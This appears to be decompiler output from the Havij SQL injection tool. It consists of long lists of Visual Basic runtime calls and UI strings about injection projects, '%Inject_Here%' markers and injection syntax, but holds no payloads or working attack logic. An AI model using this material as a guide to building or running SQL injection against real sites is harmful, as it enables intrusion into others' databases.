'N  * ref: "Invalid File!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: "I'm IDLE"
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: Mid(
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaStrVarVal
'N  * ref: Val(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaBoolVar
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_170
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaBoolVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaI2Var
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaI2Var
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaR8Var
'N  * ref: __vbaBoolVar
'N  * ref: __vbaI2Var
'N  * ref: __vbaI2Var
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaI2Var
'N  * ref: __vbaUI1Var
'N  * ref: __vbaUI1Var
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Right(
'N  * ref: "time based"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: "?"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaBoolVar
'N  * ref: __vbaR4Var
'N  * ref: "1.15"
'N  * ref: __vbaR8Str
'N  * ref: "This project has been saved with a higher version of Havij, some features maybe disabled!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaBoolVar
'N  * ref: __vbaR4Var
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaBoolVar
'N  * ref: __vbaI2Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaUI1I2
'N  * ref: __vbaUI1I2
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarMove
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: Subr_191
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: "."
'N  * ref: __vbaStrVarVal
'N  * ref: InstrRev(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: "."
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaLenVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: "Duplicated item was not loaded!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: "1.15"
'N  * ref: __vbaR8Str
'N  * ref: "Injection project converted from version "
'N  * ref: __vbaStrR8
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " to "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "1.15"
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaLenBstr
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrUI1
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrUI1
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrR8
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: "Auto"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: "::"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: "Auto Detect"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: Subr_147
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: Err
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Can not load the project! "
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: "I'm IDLE"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub PrepareTarget()
'N  * ref: __vbaExceptHandler
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "="
'N  * ref: __vbaI4Var
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "%Inject_Here%"
'N  * ref: "%Inject_Here%"
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "="
'N  * ref: __vbaI4Var
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub ApplySettings()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR8Str
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaI2Str
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaI2Str
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR8Str
'N  * ref: IIf(
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR8Str
'N  * ref: IIf(
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: IIf(
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaRedimVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "::"
'N  * ref: __vbaStrMove
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarIndexStore
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaRedim
'N  * ref: Array(
'N  * ref: __vbaErase
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
Sub Toolbar1_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "Analyze"
'N  * ref: "Stop prevoius job!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaHresultCheckObj
'N  * ref: "="
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: IIf(
'N  * ref: "="
'N  * ref: __vbaI4Var
'N  * ref: __vbaInStrVar
'N  * ref: Mid(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaHresultCheckObj
'N  * ref: "="
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: IIf(
'N  * ref: "="
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "There is no input to inject. Please enter a input parameter or user %Inject_Here% tag to define injection place."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: __vbaHresultCheckObj
'N  * ref: "="
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: "&"
'N  * ref: InstrRev(
'N  * ref: IIf(
'N  * ref: "="
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: "%Inject_Here%"
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: "Please register for Injecting URL rewerite pages!"
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register for Injecting URL rewerite pages!"
'N  * ref: MsgBox
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Invalid max column count value! Max column count can be between 1 to 2000"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: "You have selected to enter injection syntax manually but syntax text box is empty!"
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLenBstr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: "You have selected to enter positive keyword manually, please enter a keyword with length of at least 3 characters."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: Subr_186
